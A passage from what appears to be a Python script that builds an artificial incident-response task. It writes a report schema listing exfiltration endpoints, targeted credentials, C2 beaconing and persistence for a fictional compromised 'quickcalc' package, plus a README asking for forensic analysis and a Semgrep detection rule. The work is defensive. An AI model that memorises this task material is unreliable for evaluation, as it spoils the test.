                "description": "Domain(s) used for data exfiltration",
                "items": {"type": "string"}
            },
            "exfil_endpoints": {
                "type": "array",
                "description": "Full URL(s) used for data exfiltration",
                "items": {"type": "string"}
            },
            "beacon_interval_seconds": {
                "type": "integer",
                "description": "C2 beacon polling interval in seconds"
            },
            "targeted_credentials": {
                "type": "array",
                "description": "Environment variable names targeted for credential theft",
                "items": {"type": "string"}
            },
            "targeted_files": {
                "type": "array",
                "description": "File paths targeted for credential/key theft",
                "items": {"type": "string"}
            },
            "persistence_mechanism": {
                "type": "string",
                "description": "Primary persistence mechanism used by the malware"
            },
            "initial_access_vector": {
                "type": "string",
                "description": "How the attacker initially gained access to publish malicious packages"
            },
            "attacker_infrastructure_domain_registrar": {
                "type": "string",
                "description": "Registrar used for attacker-controlled domains"
            },
            "attacker_c2_decoy_ip": {
                "type": "string",
                "description": "IP address used as A record decoy for the C2 subdomain"
            },
            "compromised_tool_name": {
                "type": "string",
                "description": "Name of the CI/CD tool that was compromised to enable the attack"
            },
            "compromised_tool_version": {
                "type": "string",
                "description": "Specific version of the compromised tool"
            },
            "credential_exfil_destination": {
                "type": "string",
                "description": "Domain or URL where the compromised tool sent stolen CI credentials"
            },
            "attack_timeline": {
                "type": "array",
                "description": "Ordered list of attack events with timestamps",
                "items": {
                    "type": "object",
                    "properties": {
                        "timestamp": {"type": "string"},
                        "event": {"type": "string"}
                    }
                }
            },
            "mitre_attack_techniques": {
                "type": "array",
                "description": "MITRE ATT&CK technique IDs and names observed in this attack",
                "items": {
                    "type": "object",
                    "properties": {
                        "technique_id": {"type": "string", "description": "MITRE ATT&CK technique ID (e.g. T1059.006)"},
                        "technique_name": {"type": "string", "description": "Human-readable technique name"},
                        "description": {"type": "string", "description": "How this technique was observed in the attack"}
                    }
                }
            },
            "severity_assessment": {
                "type": "array",
                "description": "Threat severity assessment for each malicious version",
                "items": {
                    "type": "object",
                    "properties": {
                        "version": {"type": "string"},
                        "severity": {"type": "string", "enum": ["low", "medium", "high", "critical"]},
                        "justification": {"type": "string", "description": "Justification for the assigned severity level"}
                    }
                }
            }
        }
    }

    with open(f"{BASE}/report/schema.json", "w") as f:
        json.dump(schema, f, indent=2)


def create_readme():
    """Create incident context README."""
    readme = (
        "# Incident QC-2026-0319: quickcalc Supply Chain Compromise\n\n"
        "## Context\n\n"
        "The quickcalc Python library (an arithmetic utility library maintained by MathTools)\n"
        "is suspected of being compromised. A developer reported unusual network activity\n"
        "after installing a recent version.\n\n"
        "## Available Evidence\n\n"
        "- `/app/packages/` - Six versions of the quickcalc package (v1.0.0 through v1.2.2)\n"
        "- `/app/logs/` - CI/CD build logs, DNS query logs, HTTP traffic logs, PyPI upload records, WHOIS data\n"
        "- `/app/artifacts/` - A suspicious .pth file found in site-packages on a compromised build server\n\n"
        "## Your Task\n\n"
        "Perform a complete forensic analysis. Write findings to `/app/report/analysis.json`\n"
        "following the schema defined in `/app/report/schema.json`.\n\n"
        "Additionally, write a Semgrep rule to `/app/report/detect_malware.yaml` that\n"
        "detects the obfuscation patterns used in the malicious package versions.\n"
        "The rule must flag all malicious Python files without false-positiving on clean ones.\n"
    )

    with open(f"{BASE}/README.md", "w") as f:
        f.write(readme)


if __name__ == "__main__":
    # Clean versions
    create_clean_package("1.0.0", QUICKCALC_CORE_V1_0)
    create_clean_package("1.0.1", QUICKCALC_CORE_V1_0)
    create_clean_package("1.1.0", QUICKCALC_CORE_V1_1)

    # Malicious versions
    create_malicious_v120()
    create_malicious_v121()
    create_malicious_v122()

    # Log artifacts
    create_ci_logs()
    create_network_logs()

    # Output schema and readme
    create_schema()
    create_readme()

    print("Incident artifacts generated successfully.")
